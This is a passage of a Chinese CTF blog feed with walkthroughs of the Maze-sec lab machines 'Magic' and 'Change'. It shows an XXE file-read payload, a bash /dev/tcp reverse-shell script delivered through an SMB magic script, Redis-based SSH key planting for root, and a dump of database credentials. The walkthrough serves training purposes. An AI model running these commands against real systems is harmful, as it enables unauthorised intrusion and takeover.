bash">┌──(root㉿kali)-[/miao/maze-sec/magic]<br>└─# nmap -sU --top-ports 100 192.168.2.61                            <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-22 21:10 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.61<br>Host is up (0.00056s latency).<br>Not shown: 57 closed udp ports (port-unreach), 42 open|filtered udp ports (no-response)<br>PORT    STATE SERVICE<br>137/udp open  netbios-ns<br>MAC Address: 08:00:27:43:16:2D (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 53.02 seconds<br></code></pre></td></tr></table></figure><p>开放端口<code>137</code>，服务<code>netbios-ns</code></p><h1 id="三、WEB渗透"><a href="#三、WEB渗透" class="headerlink" title="三、WEB渗透"></a>三、WEB渗透</h1><p>访问80端口，是一个<code>XML Processing Service</code><br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202507222120417.png"></p><h2 id="XXE注入"><a href="#XXE注入" class="headerlink" title="XXE注入"></a>XXE注入</h2><p>尝试发现可以执行xml，尝试读取文件</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">data</span> [</span><br><span class="hljs-meta">    <span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">example</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">data</span>&gt;</span><br>    <span class="hljs-symbol">&amp;example;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">data</span>&gt;</span><br></code></pre></td></tr></table></figure><p>读取文件<code>/etc/passwd</code>，并得到当前用户为<code>tuf</code><br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202507222123729.png"></p><h1 id="四、获取SHELL"><a href="#四、获取SHELL" class="headerlink" title="四、获取SHELL"></a>四、获取SHELL</h1><h2 id="SMB服务"><a href="#SMB服务" class="headerlink" title="SMB服务"></a>SMB服务</h2><p>SMB服务开启着，使用XXE读取配置文件</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">data</span> [</span><br><span class="hljs-meta">    <span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">example</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///etc/samba/smb.conf&quot;</span>&gt;</span></span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">data</span>&gt;</span><br>    <span class="hljs-symbol">&amp;example;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">data</span>&gt;</span><br></code></pre></td></tr></table></figure><p>SMB配置文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;<br>&lt;!DOCTYPE data [<br>&lt;!ENTITY example SYSTEM <span class="hljs-string">&quot;file:///etc/samba/smb.conf&quot;</span>&gt;<br>]&gt;<br>&lt;data&gt;<br>    [global]<br>   workgroup = WORKGROUP<br>   server string = Samba Server<br>   security = user<br>   map to guest = Bad User<br><br>[magic_upload]<br>   path = /srv/samba/upload<br>   writable = <span class="hljs-built_in">yes</span><br>   guest ok = <span class="hljs-built_in">yes</span><br>   guest only = <span class="hljs-built_in">yes</span><br>   force create mode = 0777<br>   force directory mode = 0777<br>   magic script = dashazi.sh  <br><br>&lt;/data&gt;<br></code></pre></td></tr></table></figure><p>发现<code>magic_uplaod</code>可以匿名共享，同时在上传文件时<code>dashazi.sh</code>脚本会自动执行</p><p>直接进行上传，同时开启监听</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/maze-sec/magic]<br>└─# <span class="hljs-built_in">cat</span> dashazi.sh <br><span class="hljs-comment">#!/bin/bash</span><br>bash -i &gt;&amp; /dev/tcp/192.168.2.4/4444 0&gt;&amp;1<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/maze-sec/magic]<br>└─# smbclient //192.168.2.61/magic_upload -N <br>Try <span class="hljs-string">&quot;help&quot;</span> to get a list of possible commands.<br>smb: \&gt; put dashazi.sh<br><br></code></pre></td></tr></table></figure><h2 id="获取shell"><a href="#获取shell" class="headerlink" title="获取shell"></a>获取shell</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~]<br>└─# nc -lvnp 4444                        <br>listening on [any] 4444 ...<br>connect to [192.168.2.4] from (UNKNOWN) [192.168.2.61] 38766<br>bash: cannot <span class="hljs-built_in">set</span> terminal process group (448): Inappropriate ioctl <span class="hljs-keyword">for</span> device<br>bash: no job control <span class="hljs-keyword">in</span> this shell<br>nobody@Magic:/srv/samba/upload$ <span class="hljs-built_in">id</span><br><span class="hljs-built_in">id</span><br>uid=65534(nobody) gid=65534(nogroup) <span class="hljs-built_in">groups</span>=65534(nogroup)<br>nobody@Magic:/srv/samba/upload$ <br></code></pre></td></tr></table></figure><p><strong>USER FLAG</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">nobody@Magic:/home/tuf$ <span class="hljs-built_in">cat</span> user.txt<br>flag&#123;user-5c9597f3c8245907ea71a89d9d39d08e&#125;<br></code></pre></td></tr></table></figure><h1 id="五、权限提升"><a href="#五、权限提升" class="headerlink" title="五、权限提升"></a>五、权限提升</h1><p>查看以<code>root</code>权限运行的进程</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">nobody@Magic:/home/tuf$ ps aux | grep root<br>ps aux | grep root<br>.....<br>/usr/bin/redis-server 127.0.0.1:6379<br>root         371  0.0  0.1 222784  4060 ?        Ssl  09:07   0:00 <br>.....<br></code></pre></td></tr></table></figure><p>发现开放着<code>redis服务</code>，并且以<code>root</code>权限运行着</p><h2 id="1、redis写入公钥提权"><a href="#1、redis写入公钥提权" class="headerlink" title="1、redis写入公钥提权"></a>1、redis写入公钥提权</h2><p>进入redis服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">nobody@Magic:/srv/samba/upload$ redis-cli<br>127.0.0.1:6379&gt;<br>127.0.0.1:6379&gt; config <span class="hljs-built_in">set</span> <span class="hljs-built_in">dir</span> /root/.ssh/<br>OK<br>127.0.0.1:6379&gt; config <span class="hljs-built_in">set</span> dbfilename <span class="hljs-string">&quot;authorized_keys&quot;</span><br>OK<br>127.0.0.1:6379&gt; <span class="hljs-built_in">set</span> mykey <span class="hljs-string">&quot;\n\nssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBj5fESTr1FJVwvX47OzCUmh3LjoPZuwmGxeXO4RiaHD root@kali\n\n&quot;</span><br>OK<br>127.0.0.1:6379&gt; save<br>OK<br></code></pre></td></tr></table></figure><h2 id="2、提至root权限"><a href="#2、提至root权限" class="headerlink" title="2、提至root权限"></a>2、提至root权限</h2><p>直接登录即可</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/maze-sec/magic]<br>└─# ssh root@192.168.2.61         <br>Linux Magic 4.19.0-27-amd64 <span class="hljs-comment">#1 SMP Debian 4.19.316-1 (2024-06-25) x86_64</span><br><br>The programs included with the Debian GNU/Linux system are free software;<br>the exact distribution terms <span class="hljs-keyword">for</span> each program are described <span class="hljs-keyword">in</span> the<br>individual files <span class="hljs-keyword">in</span> /usr/share/doc/*/copyright.<br><br>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent<br>permitted by applicable law.<br>Last login: Sat Jul 12 22:40:51 2025 from 192.168.3.94<br>root@Magic:~# <span class="hljs-built_in">id</span><br>uid=0(root) gid=0(root) <span class="hljs-built_in">groups</span>=0(root)<br></code></pre></td></tr></table></figure><p><strong>ROOT FALG</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@Magic:~# <span class="hljs-built_in">cat</span> root.txt <br>flag&#123;root-43777257653cd6cbacd6ff02ccfc1bc0&#125;<br></code></pre></td></tr></table></figure><h1 id="【总结】"><a href="#【总结】" class="headerlink" title="【总结】"></a>【总结】</h1><h2 id="1、SMB服务"><a href="#1、SMB服务" class="headerlink" title="1、SMB服务"></a>1、SMB服务</h2><p><code>smb服务</code>的配置文件<code>/etc/samba/smb.conf</code></p><h2 id="2、redis写公钥步骤"><a href="#2、redis写公钥步骤" class="headerlink" title="2、redis写公钥步骤"></a>2、redis写公钥步骤</h2><ol><li><p>生成公钥</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/maze-sec/magic]<br>└─# ssh-keygen                  <br>Generating public/private ed25519 key pair.<br>Enter file <span class="hljs-keyword">in</span> <span class="hljs-built_in">which</span> to save the key (/root/.ssh/id_ed25519): <br>Enter passphrase (empty <span class="hljs-keyword">for</span> no passphrase): <br>Enter same passphrase again: <br>Your identification has been saved <span class="hljs-keyword">in</span> /root/.ssh/id_ed25519<br>Your public key has been saved <span class="hljs-keyword">in</span> /root/.ssh/id_ed25519.pub<br>The key fingerprint is:<br>SHA256:AFGEtZU0X1T1y0a43Mbh4R7KAQhhISyludMZsXOQpeY root@kali<br>The key<span class="hljs-string">&#x27;s randomart image is:</span><br><span class="hljs-string">+--[ED25519 256]--+</span><br><span class="hljs-string">|    =@*B*. .o....|</span><br><span class="hljs-string">|   .++Booo..  . .|</span><br><span class="hljs-string">|   o.*o. ... . +.|</span><br><span class="hljs-string">|    = =.    o O +|</span><br><span class="hljs-string">|   o E  S    + @ |</span><br><span class="hljs-string">|    .       . * .|</span><br><span class="hljs-string">|             o . |</span><br><span class="hljs-string">|                 |</span><br><span class="hljs-string">|                 |</span><br><span class="hljs-string">+----[SHA256]-----+</span><br></code></pre></td></tr></table></figure></li><li><p>将公钥保存到1.txt</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/maze-sec/magic]<br>└─# <span class="hljs-built_in">cat</span> /root/.ssh/id_ed25519.pub &gt;&gt; 1.txt<br><br>┌──(root㉿kali)-[/miao/maze-sec/magic]<br>└─# <span class="hljs-built_in">cat</span> 1.txt                             <br>ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBj5fESTr1FJVwvX47OzCUmh3LjoPZuwmGxeXO4RiaHD root@kali<br></code></pre></td></tr></table></figure></li><li><p>链接目标服务器上的Redis服务，将保存的公钥1.txt写入Redis</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> 1.txt | redis-cli -h 10.10.10.135 -x <span class="hljs-built_in">set</span> crack<br></code></pre></td></tr></table></figure></li><li><p>通过客户端远程登陆目标靶机的Redis服务，并使用<code>CONFIG GET dir</code>命令得到Redis备份的路径</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">redis-cli -h 靶机IP<br>CONFIG GET <span class="hljs-built_in">dir</span><br></code></pre></td></tr></table></figure></li><li><p>更改Redis备份路径为ssh公钥存放目录（一般默认为&#x2F;root&#x2F;.ssh）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">config <span class="hljs-built_in">set</span> <span class="hljs-built_in">dir</span> /root/.ssh<br></code></pre></td></tr></table></figure></li><li><p>设置上传公钥的备份文件名字为<code>authorized_keys</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">config <span class="hljs-built_in">set</span> dbfilename <span class="hljs-string">&quot;authorized_keys&quot;</span><br></code></pre></td></tr></table></figure></li><li><p>检查是否更改成功（查看有没有authorized_keys文件），没有问题就保存然后退出</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">CONFIG GET dbfilename<br>save<br><span class="hljs-built_in">exit</span><br></code></pre></td></tr></table></figure></li><li><p>在攻击机上使用SSH免密登录靶机</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ssh root@xxxx -i id_rsa<br></code></pre></td></tr></table></figure></li></ol>]]></content>
    
    
    <categories>
      
      <category>Maze-sec</category>
      
    </categories>
    
    
    <tags>
      
      <tag>xxe注入</tag>
      
      <tag>smb</tag>
      
      <tag>redis</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Change</title>
    <link href="/Maze-sec/Change/"/>
    <url>/Maze-sec/Change/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="靶机说明"><a href="#靶机说明" class="headerlink" title="靶机说明"></a>靶机说明</h1><p>QQ群：<code>660930334</code></p><h1 id="一、主机探测"><a href="#一、主机探测" class="headerlink" title="一、主机探测"></a>一、主机探测</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/maze-sec/change]<br>└─# nmap -sn 192.168.2.0/24               <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-21 10:29 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.1<br>Host is up (0.00060s latency).<br>MAC Address: 0A:00:27:00:00:0A (Unknown)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.2<br>Host is up (0.00040s latency).<br>MAC Address: 08:00:27:B5:D3:0B (Oracle VirtualBox virtual NIC)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.60<br>Host is up (0.00077s latency).<br>MAC Address: 08:00:27:7E:74:22 (Oracle VirtualBox virtual NIC)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.4<br>Host is up.<br>Nmap <span class="hljs-keyword">done</span>: 256 IP addresses (4 hosts up) scanned <span class="hljs-keyword">in</span> 2.15 seconds<br></code></pre></td></tr></table></figure><p>靶机IP：<code>192.168.2.60</code></p><h1 id="二、端口扫描"><a href="#二、端口扫描" class="headerlink" title="二、端口扫描"></a>二、端口扫描</h1><h2 id="1、全端口扫描"><a href="#1、全端口扫描" class="headerlink" title="1、全端口扫描"></a>1、全端口扫描</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/maze-sec/change]<br>└─# nmap --min-rate 10000 -p- 192.168.2.60                        <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-21 10:29 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.60<br>Host is up (0.00020s latency).<br>Not shown: 65532 closed tcp ports (reset)<br>PORT     STATE SERVICE<br>22/tcp   open  ssh<br>80/tcp   open  http<br>3306/tcp open  mysql<br>MAC Address: 08:00:27:7E:74:22 (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 7.92 seconds<br></code></pre></td></tr></table></figure><p>开放端口：&#96;22,80,3306</p><h2 id="2、详细信息扫描"><a href="#2、详细信息扫描" class="headerlink" title="2、详细信息扫描"></a>2、详细信息扫描</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/maze-sec/change]<br>└─# nmap --min-rate 10000 -sT -sV -sC -O -p22,80,3306 192.168.2.60<br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-21 10:30 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.60<br>Host is up (0.00078s latency).<br><br>PORT     STATE SERVICE VERSION<br>22/tcp   open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)<br>| ssh-hostkey: <br>|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)<br>|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)<br>|_  256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)<br>80/tcp   open  http    Apache httpd 2.4.62 ((Debian))<br>|_http-title: Site doesn<span class="hljs-string">&#x27;t have a title (text/html).</span><br><span class="hljs-string">|_http-server-header: Apache/2.4.62 (Debian)</span><br><span class="hljs-string">3306/tcp open  mysql   MySQL 5.5.5-10.5.23-MariaDB-0+deb11u1</span><br><span class="hljs-string">| mysql-info: </span><br><span class="hljs-string">|   Protocol: 10</span><br><span class="hljs-string">|   Version: 5.5.5-10.5.23-MariaDB-0+deb11u1</span><br><span class="hljs-string">|   Thread ID: 32</span><br><span class="hljs-string">|   Capabilities flags: 63486</span><br><span class="hljs-string">|   Some Capabilities: Speaks41ProtocolNew, Speaks41ProtocolOld, InteractiveClient, Support41Auth, SupportsLoadDataLocal, FoundRows, DontAllowDatabaseTableColumn, SupportsCompression, IgnoreSigpipes, IgnoreSpaceBeforeParenthesis, SupportsTransactions, ODBCClient, LongColumnFlag, ConnectWithDatabase, SupportsMultipleStatments, SupportsMultipleResults, SupportsAuthPlugins</span><br><span class="hljs-string">|   Status: Autocommit</span><br><span class="hljs-string">|   Salt: J&quot;e[vcjk\i&#123;OYRlJlb)A</span><br><span class="hljs-string">|_  Auth Plugin Name: mysql_native_password</span><br><span class="hljs-string">MAC Address: 08:00:27:7E:74:22 (Oracle VirtualBox virtual NIC)</span><br><span class="hljs-string">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="hljs-string">Device type: general purpose</span><br><span class="hljs-string">Running: Linux 4.X|5.X</span><br><span class="hljs-string">OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5</span><br><span class="hljs-string">OS details: Linux 4.15 - 5.8</span><br><span class="hljs-string">Network Distance: 1 hop</span><br><span class="hljs-string">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="hljs-string"></span><br><span class="hljs-string">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="hljs-string">Nmap done: 1 IP address (1 host up) scanned in 8.79 seconds</span><br></code></pre></td></tr></table></figure><h2 id="3、UDP端口扫描"><a href="#3、UDP端口扫描" class="headerlink" title="3、UDP端口扫描"></a>3、UDP端口扫描</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/maze-sec/change]<br>└─# nmap -sU --top-ports 100 192.168.2.60                         <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-21 10:31 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.60<br>Host is up (0.0017s latency).<br>Not shown: 99 closed udp ports (port-unreach)<br>PORT   STATE         SERVICE<br>68/udp open|filtered dhcpc<br>MAC Address: 08:00:27:7E:74:22 (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 108.24 seconds<br></code></pre></td></tr></table></figure><p>没有开放任何端口</p><h1 id="三、WEB渗透"><a href="#三、WEB渗透" class="headerlink" title="三、WEB渗透"></a>三、WEB渗透</h1><p>访问80端口，提示我们访问<code>change.dsz</code>，设置解析后访问，是一个登录框<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202507211654379.png"></p><p>查看页面源码，找到数据库的登录信息<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202507211656427.png"></p><h1 id="四、MySQL数据库"><a href="#四、MySQL数据库" class="headerlink" title="四、MySQL数据库"></a>四、MySQL数据库</h1><p>连接数据库</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/maze-sec/change]<br>└─# mysql -h 192.168.2.60 -P3306 -u change -p<br>Enter password: <br>ERROR 2026 (HY000): TLS/SSL error: SSL is required, but the server does not support it<br></code></pre></td></tr></table></figure><p>提示证书问题，直接跳过</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/maze-sec/change]<br>└─# mysql -h 192.168.2.60 -P3306 -u change -p --skip-ssl         <br>Enter password: <br>Welcome to the MariaDB monitor.  Commands end with ; or \g.<br>Your MariaDB connection <span class="hljs-built_in">id</span> is 45<br>Server version: 10.5.23-MariaDB-0+deb11u1 Debian 11<br><br>Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.<br><br>Support MariaDB developers by giving a star at https://github.com/MariaDB/server<br>Type <span class="hljs-string">&#x27;help;&#x27;</span> or <span class="hljs-string">&#x27;\h&#x27;</span> <span class="hljs-keyword">for</span> <span class="hljs-built_in">help</span>. Type <span class="hljs-string">&#x27;\c&#x27;</span> to clear the current input statement.<br><br>MariaDB [(none)]&gt;<br></code></pre></td></tr></table></figure><p>查看数据，发现存在<code>root</code>用户，加密方式为<code>bcrypt</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs mysql">MariaDB [(none)]&gt; show databases;<br>+--------------------+<br>| Database           |<br>+--------------------+<br>| changeweb          |<br>| information_schema |<br>+--------------------+<br>2 rows in set (0.001 sec)<br><br>MariaDB [(none)]&gt; use changeweb<br>Reading table information for completion of table and column names<br>You can turn off this feature to get a quicker startup with -A<br><br>Database changed<br>MariaDB [changeweb]&gt; show tables;<br>+---------------------+<br>| Tables_in_changeweb |<br>+---------------------+<br>| users               |<br>+---------------------+<br>1 row in set (0.001 sec)<br><br>MariaDB [changeweb]&gt; select * from uers;<br>ERROR 1146 (42S02): Table &#x27;changeweb.uers&#x27; doesn&#x27;t exist<br>MariaDB [changeweb]&gt; select * from users;<br>+----+----------+--------------------------------------------------------------+<br>| id | username | password                                                     |<br>+----+----------+--------------------------------------------------------------+<br>|  1 | root     | $2y$10$EFCK8LdjkDv1W52q0bV8.OLUicO8h6kYBqU5nE1jOcSq3qQ9l5mZG |<br>+----+----------+--------------------------------------------------------------+<br>1 row in set (0.001 sec)<br></code></pre></td></tr></table></figure><p>发现当前用户具有所有权限</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs mysql">MariaDB [changeweb]&gt; SHOW GRANTS FOR CURRENT_USER;<br>+-------------------------------------------------------------------------------------------------------+<br>| Grants for change@%                                                                                   |<br>+-------------------------------------------------------------------------------------------------------+<br>| GRANT USAGE ON *.* TO `change`@`%` IDENTIFIED BY PASSWORD &#x27;*526D926092550C5935871EE9117E7397F2715097&#x27; |<br>| GRANT ALL PRIVILEGES ON `changeweb`.* TO `change`@`%`                                                 |<br>+-------------------------------------------------------------------------------------------------------+<br>2 rows in set (0.002 sec)<br></code></pre></td></tr></table></figure><p>尝试修改root用户的密码<br><a href="https://bcrypt.online/">https://bcrypt.online/</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$2y$10<span 